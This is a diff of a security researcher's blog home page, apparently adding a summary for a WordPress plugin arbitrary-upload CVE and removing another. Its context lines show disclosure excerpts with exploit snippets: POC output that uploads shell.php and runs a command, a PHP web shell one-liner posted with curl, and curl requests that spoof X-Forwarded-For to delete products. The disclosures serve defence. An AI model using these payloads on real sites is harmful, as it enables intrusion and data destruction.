@@ -72,7 +72,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2026-01-23T00:01:00Z" />
+<meta property="og:updated_time" content="2026-06-05T00:01:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -95,13 +95,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -281,6 +281,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -301,6 +303,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -316,10 +322,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -328,6 +330,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -435,6 +439,77 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2026-06-05T00:01:00Z" class="post-date">
+        June 5, 2026
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>2 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-MDJM Event Management">
+        <a href="https://ryankozak.com/tags/mdjm-event-management">MDJM Event Management</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2026-7537">CVE-2026-7537</h3>
+<p>The WordPress <a href="https://wordpress.org/plugins/mobile-dj-manager/" target="_blank">MDJM Event Management</a> plugin (version 1.7.8.3 and prior) contains an arbitrary file upload vulnerability that allows authenticated administrators to upload malicious PHP files to the server, potentially leading to remote code execution.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<p>A POC <a href="https://github.com/d0n601/CVE-2026-7537/blob/master/CVE-2026-7537.py" target="_blank">CVE-2026-7537.py</a> is provided to demonstrate an authenticated attacker uploading shell.php and executing remote code:</p>
+<pre tabindex="0"><code>python3 ./CVE-2026-7537.py http://target-site.com admin password123
+[+] Logging into: http://target-site.com/wp-admin
+[+] Extracting nonce values...
+[+] Uploading web shell: shell.php
+[+] Web Shell Location: http://target-site.com/wp-content/uploads/2026/02/shell.php
+[+]
+[+] Executing test command: id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><h2 id="technical-description">Technical Description</h2>
+<p>The vulnerability exists in the <code>mdjm_send_comm_email()</code> function in the communications feature. The upload functionality lacks proper file validation while processing file attachments for email communications. This allows authenticated users with the <code>mdjm_comms_send</code> capability (administrators and MDJM admins by default) to upload arbitrary files, including PHP files that can be executed on the server.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2026-7537/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -557,7 +632,7 @@ www-data
         <h3 id="cve-2025-12673">CVE-2025-12673</h3>
 <p>The <a href="https://wordpress.org/plugins/flex-qr-code-generator/" target="_blank">Flex QR Code Generator</a> plugin does not validate user permission or sanitize file uploads in its <code>update_qr_code</code> AJAX endpoint, allowing unauthenticated attackers to upload arbitrary files including executable PHP scripts, leading to remote code execution.</p>
 <h2 id="tldr-exploits">TL;DR Exploits</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Upload PHP webshell</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Upload PHP webshell</span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt; shell.php
 </span></span><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://victimsite.com/wp-admin/admin-ajax.php&#34;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>  -F <span style="color:#e6db74">&#34;action=flexqr_update_qr&#34;</span> <span style="color:#ae81ff">\
@@ -626,7 +701,7 @@ www-data
         <h3 id="cve-2025-12720">CVE-2025-12720</h3>
 <p>The <a href="https://wordpress.org/plugins/g-ffl-cockpit/" target="_blank">g-FFL Cockpit</a> plugin does not implement proper authorization checks on the <code>queue</code> and <code>process</code> REST API endpoints, allowing unauthenticated users to delete arbitrary WooCommerce products by spoofing HTTP headers to bypass IP-based authentication.</p>
 <h2 id="tldr-exploits">TL;DR Exploits</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET_SITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://example.com&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET_SITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://example.com&#34;</span>
 </span></span><span style="display:flex;"><span>curl -X POST $TARGET_SITE/wp-json/fflcockpit/v1/queue -H <span style="color:#e6db74">&#34;X-Forwarded-For: 3.212.185.187&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;action&#34;:&#34;delete&#34;,&#34;products&#34;:[{&#34;id&#34;:105}]}&#39;</span> <span style="color:#f92672">&amp;&amp;</span> curl -X POST $TARGET_SITE/wp-json/fflcockpit/v1/process -H <span style="color:#e6db74">&#34;X-Forwarded-For: 3.212.185.187&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
 </span></span></code></pre></div><h2 id="details">Details</h2>
 <p>The <a href="https://plugins.trac.wordpress.org/browser/g-ffl-cockpit/trunk/includes/class-sync-endpoint.php#L34" target="_blank"><code>queue</code></a> and <a href="https://plugins.trac.wordpress.org/browser/g-ffl-cockpit/trunk/includes/class-sync-endpoint.php#L40" target="_blank"><code>process</code></a> REST API endpoints use IP-based authentication that can be bypassed by spoofing the <code>X-Forwarded-For</code> or <code>CF-Connecting-IP</code> HTTP headers. The authentication mechanism relies on <a href="https://plugins.trac.wordpress.org/browser/g-ffl-cockpit/trunk/includes/class-sync-endpoint.php#L11" target="_blank"><code>get_client_ip()</code></a> which trusts user-controllable headers, and checks against a hardcoded IP address stored in the plugin source code.</p>
@@ -690,73 +765,13 @@ www-data
         <h3 id="cve-2025-12721">CVE-2025-12721</h3>
 <p>The <a href="https://wordpress.org/plugins/g-ffl-cockpit/" target="_blank">g-FFL Cockpit</a> plugin does not implement proper authorization checks on the <code>server_status</code> REST API endpoint, allowing unauthenticated users to access sensitive server configuration information, PHP settings, database details, WordPress installation metadata, and active plugin information through an exposed public endpoint.</p>
 <h2 id="tldr-exploits">TL;DR Exploits</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET_SITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://example.com&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET_SITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://example.com&#34;</span>
 </span></span><span style="display:flex;"><span>curl -X GET $TARGET_SITE/wp-json/fflcockpit/v1/server_status | jq
 </span></span></code></pre></div><h2 id="details">Details</h2>
 <p>The <a href="https://plugins.trac.wordpress.org/browser/g-ffl-cockpit/trunk/includes/class-sync-endpoint.php#L1385" target="_blank"><code>handle_server_status()</code></a> function in <code>includes/class-sync-endpoint.php</code> retrieves and exposes comprehensive server information without requiring any authentication or capability checks. The endpoint is registered with <a href="https://plugins.trac.wordpress.org/browser/g-ffl-cockpit/trunk/includes/class-sync-endpoint.php#L91" target="_blank"><code>permission_callback =&gt; '__return_true'</code></a>, making it completely accessible to any unauthenticated visitor.</p>
         
         <div class="read-more-link">
             <a href="/posts/cve-2025-12721/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-12-04T00:02:00Z" class="post-date">
-        December 4, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-Bread &amp; Butter">
-        <a href="https://ryankozak.com/tags/bread-butter">Bread &amp; Butter</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-12189">CVE-2025-12189</h3>
-<p>The <a href="https://wordpress.org/plugins/bread-butter/" target="_blank">Bread &amp; Butter IO</a> plugin contains a vulnerability in its image upload functionality that allows <strong>any attacker</strong> to trick authenticated administrators into uploading arbitrary files to the server, including PHP web shells, leading to <strong>Remote Code Execution (RCE)</strong>. The vulnerability stems from the <code>uploadImage()</code> function lacking CSRF protection, allowing attackers to craft malicious requests that administrators&rsquo; browsers will automatically execute.</p>
-<p>The vulnerability exists in the <code>uploadImage()</code> function in <code>/bread-butter/src/Base/Ajax.php</code> which lacks proper file validation and CSRF protection, while using <code>file_put_contents()</code> to write files directly to the WordPress uploads directory before any security checks.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-12189/">Read More…</a>
         </div>
         
         
